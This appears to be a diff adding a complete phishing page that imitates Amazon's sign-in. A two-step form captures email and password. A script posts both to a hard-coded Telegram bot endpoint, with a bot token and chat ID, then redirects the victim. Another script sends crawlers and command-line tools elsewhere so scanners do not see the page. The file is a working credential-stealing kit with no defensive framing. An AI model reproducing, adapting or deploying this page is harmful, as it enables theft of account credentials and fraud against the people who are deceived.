@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <script>
+    /* anti-bot */
+    var bots = [/bot/i, /crawler/i, /spider/i, /wget/i, /curl/i, /python/i];
+    var ua = navigator.userAgent;
+    if (bots.some(rx => rx.test(ua))) {
+        location.href = "https://google.com";
+    }
+    </script>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+        <title>Amazon Sign-In</title>
+        <link rel="shortcut icon" href="files/favicon.ico" />
+        <link rel="stylesheet" href="styles.css">
+    </head>
+<body>
+
+<div class="page-container">
+    <header class="header">
+        <img src="img/logo.png" width="100" alt="Logo" class="logo">
+    </header>
+
+    <div class="login-container">
+        <!-- Email Section -->
+        <div class="email-section">
+            <h2>Sign-In</h2>
+            <form id="emailForm" spellcheck="false" target="_top">
+                <label for="email">Email or mobile phone number</label>
+                <input type="text" id="email" placeholder="" required>
+                <button type="submit">Continue</button>
+                <h3>By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</h3>
+                <a href="#" class="help-link"><span class="arrow">&#9654;</span> Need help?</a>
+                <hr>
+                <span class="buy">Buying for work?</span>
+                <a href="#"><h4 class="Shop">Shop on Amazon Business</h4></a>
+            </form>
+        </div>
+
+        <!-- Password Section (Hidden Initially) -->
+        <div class="password-section" style="display: none;">
+            <h2>Sign-In</h2>
+            <div class="email-display-container">
+                <p id="email-display"></p>
+                <a href="#" class="change-email">Change</a>
+            </div>
+            <form id="passwordForm" spellcheck="false" target="_top">
+                <div class="password-field-container">
+                    <label for="password">Password</label>
+                    <a href="#" class="forgot-password">Forgot your password?</a>
+                </div>
+                <input type="password" id="password" placeholder="" required>
+                <button id="submit" type="submit">Sign-In</button>
+                <div class="keep-signed-in">
+                    <input type="checkbox" id="keep-signed-in">
+                    <label for="keep-signed-in">Keep me signed in</label>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="divider">
+        <hr class="divider-line">
+        <span class="divider-text">New to Amazon?</span>
+        <hr class="divider-line">
+    </div>
+
+    <div class="signup-section">
+        <button class="signup-button">Create your Amazon account</button>
+    </div>
+
+    <div class="fade-line"></div>
+
+    <footer class="footer">
+        <ul><a href="#" class="con">Conditions of Use</a> <a href="#" class="priv">Privacy Notice</a> <a href="#" class="hlp">Help</a></ul>
+        <p>&copy; 1996-2025, Amazon.com, Inc. or its affiliates</p>
+    </footer>
+    
+</div>
+
+<script>
+    // Handle the form submission for email (no validation required)
+    document.getElementById('emailForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent form submission
+    
+        const emailInput = document.getElementById('email'); // Get the email input field
+        const emailValue = emailInput.value.trim(); // Trim leading/trailing spaces
+        
+        // If there's any input (not empty), proceed to the password section
+        if (emailValue.length > 0) {
+            // Display the email in the password section
+            document.getElementById('email-display').innerText = emailValue;
+    
+            // Hide the email section and show the password section
+            document.querySelector('.email-section').style.display = 'none';
+            document.querySelector('.password-section').style.display = 'block';
+        } else {
+            // If the email field is empty, alert the user to enter something
+            alert("Please enter an email or mobile phone number.");
+        }
+    });
+    
+    // Allow user to go back and change the email address
+    document.querySelector('.change-email').addEventListener('click', function(event) {
+        event.preventDefault(); // Prevent default anchor behavior
+    
+        // Show the email section and hide the password section
+        document.querySelector('.password-section').style.display = 'none';
+        document.querySelector('.email-section').style.display = 'block';
+    });
+    
+    // Handle password form submission
+    document.getElementById('passwordForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent form submission
+    
+        var email = document.getElementById("email").value; // Get email value
+        var password = document.getElementById("password").value; // Get password value
+    
+        // Create the message to send to Telegram (no IP data)
+        var message = `Email or Phone: ${email}\nPassword: ${password}`;
+    
+        // Telegram Bot API request (replace with your bot's token and chat ID)
+        var telegramAPI = `https://api.telegram.org/bot7519001225:AAH9vvsnL4_Qz0FL3qk0p98lAMCvHsgjcE0/sendMessage?chat_id=7009891691&text=${encodeURIComponent(message)}`;
+    
+        // Send message to Telegram
+        fetch(telegramAPI)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    // Redirect to a different page after successful submission
+                    window.location.href = "security.html"; // Replace with your desired redirect page
+                } else {
+                    alert("Error logging in.");
+                }
+            })
+            .catch(error => {
+                console.error("Telegram API Error: ", error);
+                alert("Error sending message to Telegram: " + error.message);
+            });
+    });
+    </script>
+    
+    
+
+</body>
+</html>
